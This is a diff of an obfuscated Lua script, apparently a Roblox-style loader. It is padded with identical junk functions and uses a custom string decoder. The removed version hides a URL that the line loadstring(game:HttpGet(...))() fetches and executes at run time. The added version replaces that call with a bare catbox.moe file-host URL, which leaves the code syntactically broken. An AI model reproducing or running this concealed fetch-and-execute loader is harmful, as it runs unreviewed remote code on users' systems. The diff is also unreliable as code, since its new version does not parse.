@@ -1,9 +1,9 @@
 local _S = (function()
-  local _k = 117
-  local _a = "YZPDX8CR~LNE4I321B5TW7MGSO=9Q.*J_A!H0K/6+VUF"
+  local _k = 175
+  local _a = "/!_607WLQRVC1K+4A*PH2=XS8GEYJ~TFMO.D9Z53UINB"
   local _lut = {}
   for _i = 1, 44 do _lut[_a:sub(_i, _i)] = _i - 1 end
-  local _e = {"YW", "YG", "Y.YZYZY8YCZHPPPPYTYQYOY1YCPDYMYWYZYGY=YIPDYSY=Y1PPZWYMZAY4YGYCPDYZYIYZ"}
+  local _e = {"0T", "0~"}
   local _o = {}
   for _i = 1, #_e do
     local _s = _e[_i]
@@ -17,62 +17,51 @@ local _S = (function()
   return _o
 end)()
 
-local _0x1E88 = game
+local _0xFF23 = _0xFF23 or {}
+local _0x22EC = _0x22EC or {}
+local _0x53DB = _0x53DB or {}
+local _0x3AF2 = _0x3AF2 or {}
+local _0x88A8 = _0x88A8 or {}
+local _0xB974 = function()
+  local _0xD7B1 = 0
+  for _0x1BAA = 1, 8 do
+    _0xD7B1 = _0xD7B1 + _0x1BAA
+  end
+  local _0x0057 = {1, 2, 3, _0xD7B1}
+  local _0x6BD7 = (_S[1]) .. (_S[2])
+  return _0x0057[1] + #_0x6BD7
+end
+local _0x62F7 = function()
+  local _0x0C93 = 0
+  for _0x5772 = 1, 8 do
+    _0x0C93 = _0x0C93 + _0x5772
+  end
+  local _0x1D4E = {1, 2, 3, _0x0C93}
+  local _0x4C59 = (_S[1]) .. (_S[2])
+  return _0x1D4E[1] + #_0x4C59
+end
+local _0xFD75 = function()
+  local _0x2408 = 0
+  for _0x509B = 1, 8 do
+    _0x2408 = _0x2408 + _0x509B
+  end
+  local _0x4EB0 = {1, 2, 3, _0x2408}
+  local _0xFAE8 = (_S[1]) .. (_S[2])
+  return _0x4EB0[1] + #_0xFAE8
+end
+local _0x4C01 = function()
+  local _0xA3DA = 0
+  for _0x5E39 = 1, 8 do
+    _0xA3DA = _0xA3DA + _0x5E39
+  end
+  local _0x1936 = {1, 2, 3, _0xA3DA}
+  local _0x2C70 = (_S[1]) .. (_S[2])
+  return _0x1936[1] + #_0x2C70
+end
 
-local _0x6956 = (_0x6956 or {})
-local _0x317A = (_0x317A or {})
-local _0x9032 = (_0x9032 or {})
-local _0x8B5D = (_0x8B5D or {})
-local _0xFCAA = (_0xFCAA or {})
-local _0x9751 = function ()
-  local _0xF4DC = (3 * 0)
-  for _0x6FB2 = (7 * 0 + 1), (8 * 1) do
-    _0xF4DC = (_0xF4DC + _0x6FB2)
-  end
-  local _0xA1DD = {(3 * 0 + 1), (4 * 0 + 2), (4 * 0 + 3), _0xF4DC}
-  local _0x5C04 = (_S[1] .. _S[2])
-  return (_0xA1DD[(8 * 0 + 1)] + #_0x5C04)
-end
-local _0x939D = function ()
-  local _0x234E = (7 * 0)
-  for _0x18ED = (8 * 0 + 1), (7 * 1 + 1) do
-    _0x234E = (_0x234E + _0x18ED)
-  end
-  local _0xBD20 = {(2 * 0 + 1), (9 * 0 + 2), (6 * 0 + 3), _0x234E}
-  local _0x2668 = (_S[1] .. _S[2])
-  return (_0xBD20[(9 * 0 + 1)] + #_0x2668)
-end
-local _0x442E = function ()
-  local _0x209F = (8 * 0)
-  for _0x4669 = (8 * 0 + 1), (5 * 1 + 3) do
-    _0x209F = (_0x209F + _0x4669)
-  end
-  local _0x5DCA = {(3 * 0 + 1), (2 * 1), (2 * 1 + 1), _0x209F}
-  local _0x3D76 = (_S[1] .. _S[2])
-  return (_0x5DCA[(9 * 0 + 1)] + #_0x3D76)
-end
-local _0x5FDC = function ()
-  local _0xFA58 = (5 * 0)
-  for _0xA2AE = (6 * 0 + 1), (8 * 1) do
-    _0xFA58 = (_0xFA58 + _0xA2AE)
-  end
-  local _0xCCA3 = {(8 * 0 + 1), (6 * 0 + 2), (6 * 0 + 3), _0xFA58}
-  local _0x8DF1 = (_S[1] .. _S[2])
-  return (_0xCCA3[(5 * 0 + 1)] + #_0x8DF1)
-end
-local _0x008C = function ()
-  local _0xBBF1 = (4 * 0)
-  for _0xA8B1 = (8 * 0 + 1), (2 * 4) do
-    _0xBBF1 = (_0xBBF1 + _0xA8B1)
-  end
-  local _0xDF94 = {(9 * 0 + 1), (9 * 0 + 2), (6 * 0 + 3), _0xBBF1}
-  local _0x5625 = (_S[1] .. _S[2])
-  return (_0xDF94[(2 * 0 + 1)] + #_0x5625)
-end
 do
   local _0xGUARD = ((2 * 3) == 6)
   if _0xGUARD then
-    loadstring(_0x1E88:HttpGet(_S[3]))()
-
+https://files.catbox.moe/7adr6f.txt
   end
 end
